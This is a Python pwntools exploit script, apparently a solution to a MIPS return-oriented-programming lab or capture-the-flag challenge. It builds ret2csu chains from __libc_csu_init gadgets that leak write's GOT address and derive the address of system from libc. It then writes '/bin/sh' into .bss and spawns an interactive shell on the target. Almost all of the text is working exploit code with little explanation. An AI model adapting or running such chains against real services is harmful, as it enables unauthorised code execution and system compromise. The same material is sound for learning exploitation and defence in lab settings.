#/usr/bin/env python
from pwn import *
import sys

def p32_big(data):
	return p32(data, endian = 'big')

s = ssh(host = 'localhost', user = 'root', password = 'root')
p = s.connect_remote('localhost', 10000)

rop = ELF('./rop')
libc = ELF('./libc.so.6')
write_plt = rop.symbols['write']
write_got = rop.got['write']
vuln_addr = rop.symbols['vuln']
bss_addr = 0x410930
read_got = rop.got['read']

p.recvuntil("Welcome to mips ROP!\n")
'''
Find your gadgets in __libc_csu_init
.text:00400770                 lw      $t9, 0($s1)
.text:00400774                 addiu   $s0, 1
.text:00400778                 move    $a0, $s3
.text:0040077C                 move    $a1, $s4
.text:00400780                 jalr    $t9
.text:00400784                 move    $a2, $s5
.text:00400788                 sltu    $v0, $s0, $s2
.text:0040078C                 bnez    $v0, loc_400770
.text:00400790                 addiu   $s1, 4
.text:00400794
.text:00400794 loc_400794:     # CODE XREF: __libc_csu_init+60
.text:00400794                 lw      $ra, 0x34($sp)
.text:00400798                 lw      $s5, 0x30($sp)
.text:0040079C                 lw      $s4, 0x2C($sp)
.text:004007A0                 lw      $s3, 0x28($sp)
.text:004007A4                 lw      $s2, 0x24($sp)
.text:004007A8                 lw      $s1, 0x20($sp)
.text:004007AC                 lw      $s0, 0x1C($sp)
.text:004007B0                 jr      $ra
.text:004007B4                 addiu   $sp, 0x38
'''
#write(1, write_got, 4)
call_addr = 0x00400770
lw7_addr = 0x00400794
s0 = 0
s1 = write_got
s2 = 1
s3 = 1
s4 = write_got
s5 = 4
ra  = vuln_addr
payload1 = 'a'*36 + p32_big(lw7_addr) + 'a'*0x1c 
payload1 += p32_big(s0) + p32_big(s1) + p32_big(s2)
payload1 += p32_big(s3) + p32_big(s4) + p32_big(s5) + p32_big(call_addr)
payload1 += 'a'*52 + p32_big(vuln_addr)

raw_input('g0')
p.sendline(payload1)

write_addr = u32(p.recv(4), endian='big')
print "[+] write_addr: " + hex(write_addr)
off = libc.symbols['write'] - libc.symbols['system']
system_addr = write_addr - off
print "[+] system_addr: " + hex(system_addr)

#read(0, bss_addr, 100)
s0 = 0
s1 = read_got
s2 = 1
s3 = 0
s4 = bss_addr
s5 = 100
ra  = vuln_addr
payload2 = 'a'*36 + p32_big(lw7_addr) + 'a'*0x1c #padding
payload2 += p32_big(s0) + p32_big(s1) + p32_big(s2)
payload2 += p32_big(s3) + p32_big(s4) + p32_big(s5) + p32_big(call_addr)
payload2 += 'a'*52 + p32_big(vuln_addr) 
p.sendline(payload2)

p.sendline(p32_big(system_addr) + "/bin/sh\x00")

##system('/bin/sh')
#raw_input('go')
'''
It's best to call sleep(1) when you connect the host by ssh.
'''
sleep(1)
s0 = 0
s1 = bss_addr
s2 = 1
s3 = bss_addr + 4
s4 = 0
s5 = 0
ra  = 0xdeadbeef
payload3 = 'a'*36 + p32_big(lw7_addr) + 'a'*0x1c #padding
payload3 += p32_big(s0) + p32_big(s1) + p32_big(s2)
payload3 += p32_big(s3) + p32_big(s4) + p32_big(s5) + p32_big(call_addr)

p.sendline(payload3)

p.interactive()